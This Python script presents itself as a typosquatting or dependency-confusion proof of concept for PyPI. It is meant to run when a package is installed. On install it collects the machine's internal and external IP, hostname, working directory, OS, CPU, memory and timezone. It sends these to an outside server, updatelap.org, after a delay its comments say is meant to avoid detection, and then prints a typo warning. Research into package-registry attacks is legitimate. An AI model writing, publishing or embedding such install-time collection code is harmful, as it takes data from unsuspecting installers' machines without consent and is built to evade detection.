#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Notification script used as a proof-of-concept (PoC) for typo squatting or dependency confusion testing
in the Python Package Index (PyPI).

This is an experimental version of the code. Use with caution and for testing purposes only.
Created on: August 28, 2025.

Copyright by [Your Name]
License: MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import platform
import socket
import sys
import time
import requests
from urllib.parse import urlencode

# Configuration
DEBUG = False
SERVER_URL = "http://updatelap.org:4242/api/log"
PACKAGE_NAME = "your-package-name"  # Replace with the intended package name
INTENDED_PACKAGE_NAME = "intended-package-name"  # Replace with the correct package name

def get_internal_ip():
    """Get the internal IP address of the machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Use Google DNS as a target
        internal_ip = s.getsockname()[0]
        s.close()
        return internal_ip
    except Exception:
        return "N/A"

def get_external_ip():
    """Get the external IP address using a public API."""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json().get("ip", "N/A")
    except Exception:
        return "N/A"

def get_hardware_info():
    """Collect basic hardware and system information."""
    try:
        os_info = platform.platform()
        cpu_arch = platform.machine()
        total_mem = str(round(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024 ** 3), 2)) + " GB"
        return {
            "os": os_info,
            "cpu_arch": cpu_arch,
            "total_mem": total_mem
        }
    except Exception:
        return {"os": "Unknown", "cpu_arch": "Unknown", "total_mem": "N/A"}

def notify_server():
    """Send a harmless callback to the server with system information."""
    try:
        internal_ip = get_internal_ip()
        external_ip = get_external_ip()
        hostname = socket.gethostname()
        current_path = os.getcwd()
        timezone = time.strftime("%Z", time.localtime())
        hardware = get_hardware_info()

        params = {
            "internalIP": internal_ip,
            "externalIP": external_ip,
            "hostname": hostname,
            "path": current_path,
            "packageName": PACKAGE_NAME,
            "intendedPackageName": INTENDED_PACKAGE_NAME,
            "osPlatform": hardware["os"],
            "cpuArch": hardware["cpu_arch"],
            "totalMem": hardware["total_mem"],
            "timeZone": timezone,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S %Z")
        }

        # Encode parameters and send GET request with a delay to avoid immediate detection
        query_string = urlencode(params)
        full_url = f"{SERVER_URL}?{query_string}"

        time.sleep(2)  # Delay to mimic normal behavior
        response = requests.get(full_url, timeout=5)

        if DEBUG:
            print(f"Response from server: {response.text}")

        print("\nWarning!!! You might have made a typo in your installation command!")
        print(f"Did you mean to install '{INTENDED_PACKAGE_NAME}' instead of '{PACKAGE_NAME}'?")
        print(f"For more details, visit http://updatelap.org")

    except Exception as e:
        if DEBUG:
            print(f"Error in notification: {e}")

def main():
    """Main entry point executed on package installation."""
    if DEBUG:
        notify_server()
    else:
        notify_server()

if __name__ == "__main__":
    main()